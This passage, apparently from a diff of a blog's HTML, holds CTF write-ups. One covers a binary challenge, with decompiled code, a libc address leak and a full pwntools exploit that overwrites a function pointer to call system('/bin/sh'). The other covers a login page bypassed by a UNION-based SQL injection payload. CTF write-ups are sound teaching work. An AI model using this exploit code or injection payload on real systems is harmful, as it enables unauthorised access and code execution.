+  <span class="kt">long</span> <span class="n">local_10</span><span class="p">;</span>
+
+  <span class="n">local_10</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">);</span>
+  <span class="n">local_14</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">"index: "</span><span class="p">);</span>
+  <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">DAT_00400a95</span><span class="p">,</span><span class="o">&amp;</span><span class="n">local_14</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">local_14</span> <span class="o">&lt;</span> <span class="mh">0x65</span><span class="p">)</span> <span class="p">{</span>
+    <span class="p">(</span><span class="o">*</span><span class="n">names</span><span class="p">.</span><span class="n">_10000_8_</span><span class="p">)(</span><span class="n">names</span> <span class="o">+</span> <span class="p">(</span><span class="n">ulong</span><span class="p">)</span><span class="n">local_14</span> <span class="o">*</span> <span class="mi">100</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="k">else</span> <span class="p">{</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"index out of bounds no hacking"</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">local_10</span> <span class="o">!=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">))</span> <span class="p">{</span>
+                    <span class="cm">/* WARNING: Subroutine does not return */</span>
+    <span class="n">__stack_chk_fail</span><span class="p">();</span>
+  <span class="p">}</span>
+  <span class="k">return</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>It is possible to overwrite this function pointer by writing data into the 100th index.</p>
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>./pwn300
+<span class="o">[</span>1] add name
+<span class="o">[</span>2] print name
+<span class="o">[</span>3] <span class="nb">exit
+</span>1
+index: 100
+pls give the name:
+A
+<span class="o">[</span>1] add name
+<span class="o">[</span>2] print name
+<span class="o">[</span>3] <span class="nb">exit
+</span>2
+index: 100
+zsh: segmentation fault  ./pwn300
+</code></pre></div></div>
+
+<p>Another thing to note is that it is possible to print out the function pointer itself if it has been unmodified, thereby leaking the address of <code class="highlighter-rouge">puts()</code>. The unprintable characters shown below contain the address in hexadecimal.</p>
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>./pwn300                                                                                               127 ⨯
+<span class="o">[</span>1] add name
+<span class="o">[</span>2] print name
+<span class="o">[</span>3] <span class="nb">exit
+</span>2
+index: 100
+���
+<span class="o">[</span>1] add name
+<span class="o">[</span>2] print name
+<span class="o">[</span>3] <span class="nb">exit
+</span>3
+</code></pre></div></div>
+
+<p>We can open up the library in GDB to figure out the offset of <code class="highlighter-rouge">puts()</code> and the offset of <code class="highlighter-rouge">system()</code> from the base of libc.</p>
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>gdb libc-2.31.so
+GNU gdb <span class="o">(</span>Debian 10.1-1.4<span class="o">)</span> 10.1
+
+<span class="o">[</span>...]
+
+gef➤  info functions puts
+All functions matching regular expression <span class="s2">"puts"</span>:
+
+Non-debugging symbols:
+0x0000000000085e60  _IO_fputs
+0x0000000000085e60  fputs
+0x00000000000875a0  _IO_puts
+0x00000000000875a0  puts
+0x00000000000914a0  fputs_unlocked
+0x00000000001273c0  putspent
+0x0000000000129090  putsgent
+gef➤  info functions system
+All functions matching regular expression <span class="s2">"system"</span>:
+
+Non-debugging symbols:
+0x0000000000055410  __libc_system
+0x0000000000055410  system
+0x0000000000156a80  svcerr_systemerr
+</code></pre></div></div>
+
+<p>We can write some Python code to calculate the base of libc by subtracting <code class="highlighter-rouge">0x875a0</code> from the leaked address of <code class="highlighter-rouge">puts()</code>. Then we can calculate the address of <code class="highlighter-rouge">system()</code> by adding <code class="highlighter-rouge">0x55410</code> to that value.</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
+</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="c1"># Open the process
+</span><span class="n">env</span> <span class="o">=</span> <span class="p">{</span><span class="s">"LD_PRELOAD"</span><span class="p">:</span> <span class="s">"./libc-2.31.so"</span><span class="p">}</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">"./pwn300"</span><span class="p">,</span> <span class="n">env</span><span class="o">=</span><span class="n">env</span><span class="p">)</span>
+<span class="c1"># gdb.attach(p, "b *print_name+143\nc\nc")
+</span>
+<span class="c1"># Ignore first few lines
+</span><span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">3</span><span class="p">):</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+
+<span class="c1"># Leak the address of puts() and calculate offsets
+</span><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"2"</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"100"</span><span class="p">)</span>
+<span class="n">puts_addr</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()[</span><span class="mi">7</span><span class="p">:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+<span class="n">puts_addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">puts_addr</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="nb">hex</span><span class="p">(),</span> <span class="mi">16</span><span class="p">)</span>
+<span class="n">libc_addr</span> <span class="o">=</span> <span class="n">puts_addr</span> <span class="o">-</span> <span class="mh">0x875a0</span>
+<span class="n">system_addr</span> <span class="o">=</span> <span class="n">libc_addr</span> <span class="o">+</span> <span class="mh">0x55410</span>
+</code></pre></div></div>
+
+<p>Now how do we pass in the input parameters? Using a ROP chain to POP the address of a <code class="highlighter-rouge">/bin/sh</code> string did not work when I tried it because only one address on the stack gets overwritten. Instead, if we look back at the line of code in Ghidra that executes the function pointer, we can see that the string inside of the buffer we’re currently using is always going to be used as an input parameter for the program.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">(</span><span class="o">*</span><span class="n">names</span><span class="p">.</span><span class="n">_10000_8_</span><span class="p">)(</span><span class="n">names</span> <span class="o">+</span> <span class="p">(</span><span class="n">ulong</span><span class="p">)</span><span class="n">local_14</span> <span class="o">*</span> <span class="mi">100</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>In other words, suppose we were to write “/bin/sh” into the 99th index of the array. Then we could use the “print name” option on the 99th index to call our function pointer, which should be overwritten with the address of <code class="highlighter-rouge">system()</code>. Since this line of code should use whatever we’ve written into the 99th index of the array, we will therefore be able to call <code class="highlighter-rouge">system("/bin/sh")</code> and get a shell!</p>
+
+<p>Here is the code that does just that:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
+</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="c1"># Open the process
+</span><span class="n">env</span> <span class="o">=</span> <span class="p">{</span><span class="s">"LD_PRELOAD"</span><span class="p">:</span> <span class="s">"./libc-2.31.so"</span><span class="p">}</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">"./pwn300"</span><span class="p">,</span> <span class="n">env</span><span class="o">=</span><span class="n">env</span><span class="p">)</span>
+
+<span class="c1"># Ignore first few lines
+</span><span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">3</span><span class="p">):</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+
+<span class="c1"># Leak the address of puts() and calculate offsets
+</span><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"2"</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"100"</span><span class="p">)</span>
+<span class="n">puts_addr</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()[</span><span class="mi">7</span><span class="p">:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+<span class="n">puts_addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">puts_addr</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="nb">hex</span><span class="p">(),</span> <span class="mi">16</span><span class="p">)</span>
+<span class="n">libc_addr</span> <span class="o">=</span> <span class="n">puts_addr</span> <span class="o">-</span> <span class="mh">0x875a0</span>
+<span class="n">system_addr</span> <span class="o">=</span> <span class="n">libc_addr</span> <span class="o">+</span> <span class="mh">0x55410</span>
+
+<span class="c1"># Set the function parameters
+</span><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"1"</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"99"</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">)</span>
+
+<span class="c1"># Overwrite puts() pointer and execute
+</span><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"1"</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"100"</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">system_addr</span><span class="p">))</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"2"</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"99"</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p>This will give the attacker a shell.</p>
+
+<h3 id="rookie-mistake">Rookie Mistake</h3>
+<p>In this web challenge, we are presented with a basic login screen.</p>
+
+<p><img style="margin-left: auto; margin-right: auto; width: 50%; height: 50%;" src="../../../assets/img/2021-1-9-lm-cyber-ctf-writeups-for-pwn-and-web-challenges/rookiemistake1.png" /></p>
+
+<p>I tried typing in a double quotation mark character (“) into the login prompt.</p>
+
+<p><img style="margin-left: auto; margin-right: auto; width: 50%; height: 50%;" src="../../../assets/img/2021-1-9-lm-cyber-ctf-writeups-for-pwn-and-web-challenges/rookiemistake2.png" /></p>
+
+<p>When I did this, I was presented with the text shown below, meaning that this is likely vulnerable to a SQL injection.</p>
+
+<p><img style="margin-left: auto; margin-right: auto; width: 50%; height: 50%;" src="../../../assets/img/2021-1-9-lm-cyber-ctf-writeups-for-pwn-and-web-challenges/rookiemistake3.png" /></p>
+
+<p>The organizers of the CTF also gave us the following hint for this challenge:</p>
+
+<p><img style="margin-left: auto; margin-right: auto; width: 50%; height: 50%;" src="../../../assets/img/2021-1-9-lm-cyber-ctf-writeups-for-pwn-and-web-challenges/rookiemistake4.png" /></p>
+
+<p>Based on this message, we know that the SQL query that gets sent through the <code class="highlighter-rouge">name</code> parameter is in the form:</p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">select</span> <span class="n">sha256pwdhash</span> <span class="k">from</span> <span class="n">login</span> <span class="k">where</span> <span class="n">username</span><span class="o">=</span><span class="nv">"{}"</span><span class="p">.</span><span class="n">format</span><span class="p">(</span><span class="n">name</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>What if we were to slightly modify this SQL query so that it would return a SHA256 hash that we type in? I looked up the SHA256 hash for the empty string, and it was <code class="highlighter-rouge">e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855</code>. With this knowledge, I wrote <code class="highlighter-rouge">"union select "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"--</code> into the <code class="highlighter-rouge">name</code> parameter. This meant that the entire SQL query would become</p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">select</span> <span class="n">sha256pwdhash</span> <span class="k">from</span> <span class="n">login</span> <span class="k">where</span> <span class="n">username</span><span class="o">=</span><span class="nv">""</span><span class="k">union</span> <span class="k">select</span> <span class="nv">"e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"</span><span class="c1">--"</span>
+</code></pre></div></div>
+
+<p>In other words, I am adding the SHA256 hash for the empty string into the result for the SQL query.</p>
+
+<p><img style="margin-left: auto; margin-right: auto; width: 50%; height: 50%;" src="../../../assets/img/2021-1-9-lm-cyber-ctf-writeups-for-pwn-and-web-challenges/rookiemistake5.png" /></p>
+
+<p>The next page showed the following text.
+<img style="margin-left: auto; margin-right: auto; width: 50%; height: 50%;" src="../../../assets/img/2021-1-9-lm-cyber-ctf-writeups-for-pwn-and-web-challenges/rookiemistake6.png" /></p>
+
+<p>To login as administrator, I needed the <code class="highlighter-rouge">username</code> parameter of the SQL query to be equal to <code class="highlighter-rouge">administrator</code>. This meant that my SQL query had to look more like this:</p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">select</span> <span class="n">sha256pwdhash</span> <span class="k">from</span> <span class="n">login</span> <span class="k">where</span> <span class="n">username</span><span class="o">=</span><span class="nv">"administrator"</span><span class="k">union</span> <span class="k">select</span> <span class="nv">"e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"</span><span class="c1">--"</span>
+</code></pre></div></div>
+
+<p>The only change I made from the previous input was that I put the word “administrator” at the beginning of my SQL injection.</p>
+
+<p><img style="margin-left: auto; margin-right: auto; width: 50%; height: 50%;" src="../../../assets/img/2021-1-9-lm-cyber-ctf-writeups-for-pwn-and-web-challenges/rookiemistake7.png" /></p>
+
+<p>On the next page, I received the flag.
+<img style="margin-left: auto; margin-right: auto; width: 50%; height: 50%;" src="../../../assets/img/2021-1-9-lm-cyber-ctf-writeups-for-pwn-and-web-challenges/rookiemistake8.png" /></p>
 
 <section class="related">
   <h3 style="color: black">Related Posts</h3>
   <ul class="post-list">
-    
-      <li style="color: black; font-size: 9;">
-        <a href="/2021/01/09/lm-cyber-ctf-writeups-for-pwn-and-web-challenges.html">
-          LM Cyber CTF Writeups For PWN And Web Challenges
-        </a>
-      </li>
     
       <li style="color: black; font-size: 9;">
         <a href="/2021/01/07/hooking-linux-function-calls-via-ld-preload.html">
@@ -298,6 +745,12 @@ flag is flag{!#&amp;*/5&lt;DMW}
       <li style="color: black; font-size: 9;">
         <a href="/2021/01/03/got-overwrite-using-format-strings.html">
           GOT Overwrite Using Format Strings
+        </a>
+      </li>
+    
+      <li style="color: black; font-size: 9;">
+        <a href="/2020/12/30/creating-a-basic-heap-allocator.html">
+          Creating a Basic Heap Allocator
         </a>
       </li>
     
